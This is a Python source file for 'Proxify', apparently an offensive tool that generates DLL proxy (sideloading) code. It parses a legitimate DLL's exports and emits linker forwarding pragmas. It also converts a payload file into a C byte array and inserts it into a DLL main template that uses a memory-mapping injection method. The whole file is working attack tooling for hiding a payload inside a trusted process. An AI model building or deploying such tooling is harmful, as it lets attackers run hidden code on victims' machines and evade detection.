import argparse , pefile , sys , os

from core.prompt import RavePrompt as prompt , Colors

from core.templates import Templates

import pyperclip

######## ARGPARSE ########



def get_C_payload(binary_content : bytes):

    TEMP = 'unsigned char PAY[] = { **HEX_PAY** };'
    PAY_STR = ''

    for BYTE in binary_content:

        PAY_STR += f'{hex(BYTE)},'

        


    return TEMP.replace('**HEX_PAY**',PAY_STR)

file_exists = os.path.isfile

parser = argparse.ArgumentParser (
    prog = 'Proxify',
    description = 'Simple DLL proxy generator'
)




parser.add_argument('-d' , '--dll' , help = 'Path to dll to proxy')
parser.add_argument('-p' , '--payload' , help = 'Path to payload file')
parser.add_argument('-o' , '--output' , help = 'Path to output C file')
parser.add_argument('-t' , '--template' , help = 'Path to output C file')


arguments = parser.parse_args()

DEBUG_MODE      =   True
DLL_PATH        =   os.path.abspath(arguments.dll)
PAYLOAD_PATH    =   arguments.payload
OUTPUT_PATH     =   arguments.output
TEMPLATE        =   arguments.template



INJECTION_METHOD    =   Templates.Injections.MappingInjection

DLL_ENTRY_TEMP = Templates.Main.DLL_MAIN


ORANGE = Colors.ORANGE
END = Colors.END


if not DLL_PATH:

    prompt.print_min('Please specify a DLL path.')
    sys.exit(0)


if not file_exists(DLL_PATH):

    prompt.print_min('Specified DLL was not found.')
    sys.exit(0)
'''if not PAYLOAD_PATH:

    prompt.print_min('Please specify a payload path.')
    sys.exit(0)


if not file_exists(PAYLOAD_PATH):

    prompt.print_min('Specified payload file was not found.')
    sys.exit(0)'''


if not OUTPUT_PATH:

    prompt.print_mult('No output path was specified , Defaulting to dllmain.c ...')
    
    OUTPUT_PATH = 'dllmain.c'


if file_exists(OUTPUT_PATH):
    prompt.print_min('Output path is occupied.')
    sys.exit(0)



DLL = pefile.PE(DLL_PATH)



if not hasattr(DLL , 'DIRECTORY_ENTRY_EXPORT'):

    prompt.print_min('Specified DLL does not have any exported routines.')

    sys.exit(0)



EAT = DLL.DIRECTORY_ENTRY_EXPORT.symbols

ROUTINE_COUNT = len (EAT)




PRAGMA_COMMENT_LINK_TEMPLATE = '#pragma comment(linker , "/export:{}={}.{}")'
COMMENTS = [ ]

for ENTRY in EAT:

    NAME = ENTRY.name


    if not NAME: continue


    NAME_DECODED = NAME.decode()

    ORDINAL = ENTRY.ordinal

    if DEBUG_MODE:
        prompt.print_mult(f'Proxying {ORANGE}{NAME_DECODED}{END} , Ordinal : {ORANGE}{ORDINAL}{END} ...')

    PROXY_COMMENT = PRAGMA_COMMENT_LINK_TEMPLATE.format(NAME_DECODED,DLL_PATH.rstrip('.dll').replace('\\' , '\\\\') , NAME_DECODED)

    COMMENTS.append(PROXY_COMMENT)



PRAGMA_CONTENT = '\n'.join(COMMENTS)

with open(OUTPUT_PATH , 'a') as OUTPUT_FILE:

    pay = get_C_payload(open(PAYLOAD_PATH , 'rb').read())

    if DEBUG_MODE:

        pyperclip.copy(pay)

        prompt.print_plus('Copied payload to clipboard!')

    CONTENT = DLL_ENTRY_TEMP.replace('**PRAGMA_COMMENTS**' , PRAGMA_CONTENT).replace('**PAYLOAD**' , pay).replace('**MAIN_FUNC**' , INJECTION_METHOD.payload)

    OUTPUT_FILE.write(CONTENT)

    OUTPUT_FILE.close()

prompt.print_plus(f'Proxied {ORANGE}{ROUTINE_COUNT}{END} Routines from {ORANGE}{DLL_PATH}{END}.')





